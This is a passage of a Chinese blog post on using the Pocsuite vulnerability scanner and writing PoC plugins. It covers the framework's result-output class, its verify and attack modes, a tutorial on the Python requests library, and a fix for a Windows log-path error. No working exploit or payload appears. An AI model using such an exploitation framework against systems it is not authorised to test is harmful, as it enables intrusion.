tuple()</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        if poc:</span><br><span class="line">            self.url = poc.url</span><br><span class="line">            self.mode = poc.mode</span><br><span class="line">            self.vul_id = poc.vulID</span><br><span class="line">            self.name = poc.name</span><br><span class="line">            self.app_name = poc.appName</span><br><span class="line">            self.app_version = poc.appVersion</span><br><span class="line">            self.error_msg = poc.expt</span><br><span class="line">    def success(self, result):</span><br><span class="line">        assert isinstance(result, dict)</span><br><span class="line">        self.status = OUTPUT_STATUS.SUCCESS</span><br><span class="line">        self.result = result</span><br><span class="line"></span><br><span class="line">    def fail(self, error=&quot;&quot;):</span><br><span class="line">        assert isinstance(error, str)</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        self.error_msg = (0, error)</span><br><span class="line"></span><br><span class="line">class OUTPUT_STATUS:</span><br><span class="line">    SUCCESS = 1</span><br><span class="line">    FAILED = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在使用Pocsuite的时候，我们可以用<code>--verify</code>参数来调用<code>_verify</code>方法，用<code>--attack</code>参数来调用<code>_attack</code>方法。</p>
<h3 id="库的使用"><a href="#库的使用" class="headerlink" title="库的使用"></a>库的使用</h3><p>Python库引用模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pocsuite.api.poc import register</span><br><span class="line">from pocsuite.api.poc import Output, POCBase</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br></pre></td></tr></table></figure>



<h4 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h4><p>pocsuite 中自带经过改装的 req，from pocsuite.api.request import req，pocsuite 中的 req 可以使用随机的 UA</p>
<p>requests库的七个主要方法:</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207183053786.png" class title="image-20220207183053786">



<p>对于在编写poc中常用到的几个request库的函数为get(),post()和put(),所有的函数调用格式相同。</p>
<p>函数格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=requests.get(url,params,**kwargs)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">url: 需要爬取的网站地址。</span><br><span class="line"></span><br><span class="line">params: 翻译过来就是参数， url中的额外参数，字典或者字节流格式，可选。</span><br><span class="line"></span><br><span class="line">**kwargs : 12个控制访问的参数</span><br><span class="line">params：字典或字节序列， 作为参数增加到url中,使用这个参数可以把一些键值对以?key1=value1&amp;key2=value2的模式增加到url中</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;:&#x27; values&#x27;, &#x27;key2&#x27;: &#x27;values&#x27;&#125; </span><br><span class="line">r = requests.get(&#x27;http:www.python123.io/ws&#x27;, params=kw)</span><br><span class="line"></span><br><span class="line">data：字典，字节序或文件对象，重点作为向服务器提供或提交资源是提交，，作为request的内容，与params不同的是，data提交的数据并不放在url链接里， 而是放在url链接对应位置的地方作为数据来存储。，它也可以接受一个字符串对象。(request.post()函数)</span><br><span class="line"></span><br><span class="line">json：json格式的数据， json合适在相关的html，http相关的web开发中非常常见， 也是http最经常使用的数据格式， 他是作为内容部分可以向服务器提交。</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;: &#x27;value1&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, json=kv)</span><br><span class="line"></span><br><span class="line">headers：字典是http的相关语，对应了向某个url访问时所发起的http的头i字段， 可以用这个字段来定义http的访问的http头，可以用来模拟任何我们想模拟的浏览器来对url发起访问。</span><br><span class="line">例子： hd = &#123;&#x27;user-agent&#x27;: &#x27;Chrome/10&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, headers=hd)</span><br><span class="line"></span><br><span class="line">cookies：字典或CookieJar，指的是从http中解析cookie</span><br><span class="line"></span><br><span class="line">auth：元组，用来支持http认证功能</span><br><span class="line"></span><br><span class="line">files：字典， 是用来向服务器传输文件时使用的字段。</span><br><span class="line">例子：fs = &#123;&#x27;files&#x27;: open(&#x27;data.txt&#x27;, &#x27;rb&#x27;)&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, files=fs)</span><br><span class="line"></span><br><span class="line">timeout: 用于设定超时时间， 单位为秒，当发起一个get请求时可以设置一个timeout时间， 如果在timeout时间内请求内容没有返回， 将产生一个timeout的异常。</span><br><span class="line"></span><br><span class="line">proxies：字典， 用来设置访问代理服务器。</span><br><span class="line"></span><br><span class="line">allow_redirects: 开关， 表示是否允许对url进行重定向， 默认为True。</span><br><span class="line"></span><br><span class="line">stream: 开关， 指是否对获取内容进行立即下载， 默认为True。</span><br><span class="line"></span><br><span class="line">verify：开关， 用于认证SSL证书， 默认为True。</span><br><span class="line"></span><br><span class="line">cert： 用于设置保存本地SSL证书路径</span><br></pre></td></tr></table></figure>



<p>其中response对象有以下属性：</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207184854731.png" class title="image-20220207184854731">



<p><strong>requests库的异常</strong></p>
<p>注意<code>requests</code>库有时会产生异常，比如网络连接错误、<code>http</code>错误异常、重定向异常、请求<code>url</code>超时异常等等。所以我们需要判断<code>r.status_codes</code>是否是200，在这里我们怎么样去捕捉异常呢？</p>
<p>这里我们可以利用<code>r.raise_for_status()</code> 语句去捕捉异常，该语句在方法内部判断<code>r.status_code</code>是否等于200，如果不等于，则抛出异常。</p>
<p>于是在这里我们有一个爬取网页的通用代码框架：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    r=requests.get(url,timeout=30)#请求超时时间为30秒</span><br><span class="line">    r.raise_for_status()#如果状态不是200，则引发异常</span><br><span class="line">    r.encoding=r.apparent_encoding #配置编码</span><br><span class="line">    return r.text</span><br><span class="line">except:</span><br><span class="line">    return &quot;产生异常&quot; </span><br></pre></td></tr></table></figure>



<h2 id="Windows下Pocsuite写日志URL带冒号报错"><a href="#Windows下Pocsuite写日志URL带冒号报错" class="headerlink" title="Windows下Pocsuite写日志URL带冒号报错"></a>Windows下Pocsuite写日志URL带冒号报错</h2><h3 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h3><p>Windows平台使用Pocsuite，当输入的url带有<code>:</code>的时会报错，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] unable to create output directory </span><br><span class="line">         &#x27;C:\Users\Administrator\.pocsuite\output\127.0.0.1:8080&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h3><p>原来保存日志记录会选取<code>C:\Users\Administrator\.pocsuite\output\</code>拼接上url地址，而windows下文件名不允许含有<code>:</code>，所以才会报错。</p>
<p>所以，不论URL是<code>http://</code>还是带有冒号都会报错，看来pocsuite这边在创建这个文件名的时候名没有检查文件名字是否还有特殊符号呀。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>手动改代码解决问题：反向追踪哪个文件做了创建文件夹的操作。</p>
<p>经查找，发现该操作代码存在于<code>pocsuite\lib\controller\controller.py</code>文件。</p>
<p>从131行代码开始，定义了一个<code>_setRecordFiles()</code>函数，该函数会创建文件夹。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def _setRecordFiles():</span><br><span class="line">    for (target, pocname, pocid, component, version, status, r_time, result) in kb.results:</span><br><span class="line">        if type(status) != str:</span><br><span class="line">            status = status[1]</span><br><span class="line">            target=target.replace(&quot;:&quot;,&quot;_&quot;) #这里添加了一行替换代码</span><br><span class="line">        outputPath = os.path.join(getUnicode(paths.POCSUITE_OUTPUT_PATH), normalizeUnicode(getUnicode(target)))</span><br></pre></td></tr></table></figure>



<p>可以发现<code>_setRecordFiles()</code>函数从<code>kb.results</code>这个数据实例里面取值。</p>
<p>我们用<code>target=target.replace(&quot;:&quot;,&quot;_&quot;)</code>来将<code>:</code>替换成<code>&quot;_&quot;</code>，问题解决。</p>
 
      <!-- reward -->
      
      <div id="reword-out">
        <div id="reward-btn">
          打赏
        </div>
      </div>
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pocsuite%E6%89%AB%E6%8F%8F%E5%99%A8-Poc%E7%BC%96%E5%86%99/" rel="tag">-Pocsuite扫描器 -Poc编写</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
    
      <a href="/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">git用法小记</div>
      </a>
    
  </nav>

   
<!-- valine评论 -->
<div id="vcomments-box">
  <div id="vcomments"></div>
</div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
<script>
  new Valine({
    el: "#vcomments",
    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
    path: window.location.pathname,
    avatar: "monsterid",
    placeholder: "给我的文章加点评论吧~",
    recordIP: true,
  });
  const infoEle = document.querySelector("#vcomments .info");
  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
    infoEle.childNodes.forEach(function (item) {
      item.parentNode.removeChild(item);
    });
  }
</script>
<style>
  #vcomments-box {
    padding: 5px 30px;
  }

  @media screen and (max-width: 800px) {
    #vcomments-box {
      padding: 5px 0px;
    }
  }

  #vcomments-box #vcomments {
    background-color: #fff;
  }

  .v .vlist .vcard .vh {
    padding-right: 20px;
  }

  .v .vlist .vcard {
    padding-left: 10px;
  }
</style>

 
   
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2021-2022
        <i class="ri-heart-fill heart_icon"></i> John Doe
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
    

  </div>
</body>

</html>